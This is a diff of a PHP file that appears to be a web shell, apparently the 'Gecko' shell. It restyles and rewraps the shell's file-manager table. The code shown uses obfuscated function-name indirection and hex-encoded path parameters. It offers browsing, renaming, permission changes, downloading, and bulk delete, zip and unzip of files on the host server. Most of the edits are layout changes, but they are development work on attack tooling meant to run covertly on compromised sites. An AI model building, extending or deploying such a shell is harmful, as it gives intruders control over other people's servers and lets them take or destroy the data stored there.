@@ -825,7 +825,7 @@ if ($_GET['don'] == true) {
             max-height: calc(100vh - 160px);
             display: flex;
             flex-direction: column;
-            overflow: hidden;
+            overflow: auto;
         }
 
         .action-bar {
@@ -891,12 +891,10 @@ if ($_GET['don'] == true) {
             transform: scale(1.05);
         }
 
-        /* Table Styles
+        /* Table Styles */
         .table-wrapper {
             overflow-x: auto;
             min-height: 0;
-            height: 150vh;
-            max-height: 150vh;
             scrollbar-width: thin;
             scrollbar-color: #64ffda rgba(17, 34, 64, 0.6);
         }
@@ -918,14 +916,15 @@ if ($_GET['don'] == true) {
 
         .table-wrapper::-webkit-scrollbar-thumb:hover {
             background: #52e8c5;
-        } */
+        }
 
         .file-table {
             width: 100%;
             border-collapse: separate;
             border-spacing: 0;
             border-radius: 6px;
-            overflow: hidden;
+            overflow-y: auto;
+            height: 100px;
         }
 
         .file-table thead {
@@ -1663,78 +1662,80 @@ if ($_GET['don'] == true) {
         </div>
 
         <form action="" method="post" style="flex: 1; display: flex; flex-direction: column; min-height: 0;">
-            <table class="file-table">
-                <thead>
-                    <tr>
-                        <th><i class="fa-solid fa-file-lines"></i> Name</th>
-                        <th><i class="fa-solid fa-weight-hanging"></i> Size</th>
-                        <th><i class="fa-solid fa-shield-halved"></i> Permission</th>
-                        <th><i class="fa-solid fa-gears"></i> Action</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <?php foreach ($file_manager as $_D) : ?>
-                        <?php if ($fungsi[2]($_D)) : ?>
-                            <tr>
-                                <td>
-                                    <input type="checkbox" name="check[]" value="<?= $_D ?>">
-                                    <i class="fa-solid fa-folder" style="color:#ffd54f; font-size: 18px;"></i>
-                                    <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a>
-                                </td>
-                                <td><span class="badge badge-dir">DIR</span></td>
-                                <td class="<?php echo $fungsi[4]($fungsi[0]() . '/' . $_D) ? 'perm-writable' : 'perm-readonly'; ?>">
-                                    <?php echo perms($fungsi[0]() . '/' . $_D); ?>
-                                </td>
-                                <td>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
-                                        <i class="fa-solid fa-pen-to-square"></i>
-                                    </a>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
-                                        <i class="fa-solid fa-user-pen"></i>
-                                    </a>
-                                </td>
-                            </tr>
-                        <?php endif; ?>
-                    <?php endforeach; ?>
+            <div class="table-wrapper">
+                <table class="file-table">
+                    <thead>
+                        <tr>
+                            <th><i class="fa-solid fa-file-lines"></i> Name</th>
+                            <th><i class="fa-solid fa-weight-hanging"></i> Size</th>
+                            <th><i class="fa-solid fa-shield-halved"></i> Permission</th>
+                            <th><i class="fa-solid fa-gears"></i> Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php foreach ($file_manager as $_D) : ?>
+                            <?php if ($fungsi[2]($_D)) : ?>
+                                <tr>
+                                    <td>
+                                        <input type="checkbox" name="check[]" value="<?= $_D ?>">
+                                        <i class="fa-solid fa-folder" style="color:#ffd54f; font-size: 18px;"></i>
+                                        <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a>
+                                    </td>
+                                    <td><span class="badge badge-dir">DIR</span></td>
+                                    <td class="<?php echo $fungsi[4]($fungsi[0]() . '/' . $_D) ? 'perm-writable' : 'perm-readonly'; ?>">
+                                        <?php echo perms($fungsi[0]() . '/' . $_D); ?>
+                                    </td>
+                                    <td>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
+                                            <i class="fa-solid fa-pen-to-square"></i>
+                                        </a>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
+                                            <i class="fa-solid fa-user-pen"></i>
+                                        </a>
+                                    </td>
+                                </tr>
+                            <?php endif; ?>
+                        <?php endforeach; ?>
 
-                    <?php foreach ($file_manager as $_F) : ?>
-                        <?php if ($fungsi[3]($_F)) : ?>
-                            <tr>
-                                <td>
-                                    <input type="checkbox" name="check[]" value="<?= $_F ?>">
-                                    <?= file_ext($_F) ?>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a>
-                                </td>
-                                <td><span class="file-size"><?= formatSize(filesize($_F)); ?></span></td>
-                                <td class="<?php echo is_writable($fungsi[0]() . '/' . $_F) ? 'perm-writable' : 'perm-readonly'; ?>">
-                                    <?php echo perms($fungsi[0]() . '/' . $_F); ?>
-                                </td>
-                                <td>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
-                                        <i class="fa-solid fa-pen-to-square"></i>
-                                    </a>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
-                                        <i class="fa-solid fa-user-pen"></i>
-                                    </a>
-                                    <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Download">
-                                        <i class="fa-solid fa-download"></i>
-                                    </a>
-                                </td>
-                            </tr>
-                        <?php endif; ?>
-                    <?php endforeach; ?>
-                </tbody>
-            </table>
+                        <?php foreach ($file_manager as $_F) : ?>
+                            <?php if ($fungsi[3]($_F)) : ?>
+                                <tr>
+                                    <td>
+                                        <input type="checkbox" name="check[]" value="<?= $_F ?>">
+                                        <?= file_ext($_F) ?>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a>
+                                    </td>
+                                    <td><span class="file-size"><?= formatSize(filesize($_F)); ?></span></td>
+                                    <td class="<?php echo is_writable($fungsi[0]() . '/' . $_F) ? 'perm-writable' : 'perm-readonly'; ?>">
+                                        <?php echo perms($fungsi[0]() . '/' . $_F); ?>
+                                    </td>
+                                    <td>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
+                                            <i class="fa-solid fa-pen-to-square"></i>
+                                        </a>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
+                                            <i class="fa-solid fa-user-pen"></i>
+                                        </a>
+                                        <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Download">
+                                            <i class="fa-solid fa-download"></i>
+                                        </a>
+                                    </td>
+                                </tr>
+                            <?php endif; ?>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
 
-            <div class="bulk-actions">
-                <select name="gecko-select" class="btn">
-                    <option value="delete">Delete Selected</option>
-                    <option value="unzip">Unzip Selected</option>
-                    <option value="zip">Zip Selected</option>
-                </select>
-                <button type="submit" name="submit-action" class="btn">
-                    <i class="fa-solid fa-check"></i> Execute Action
-                </button>
+                <div class="bulk-actions">
+                    <select name="gecko-select" class="btn">
+                        <option value="delete">Delete Selected</option>
+                        <option value="unzip">Unzip Selected</option>
+                        <option value="zip">Zip Selected</option>
+                    </select>
+                    <button type="submit" name="submit-action" class="btn">
+                        <i class="fa-solid fa-check"></i> Execute Action
+                    </button>
+                </div>
             </div>
         </form>
 
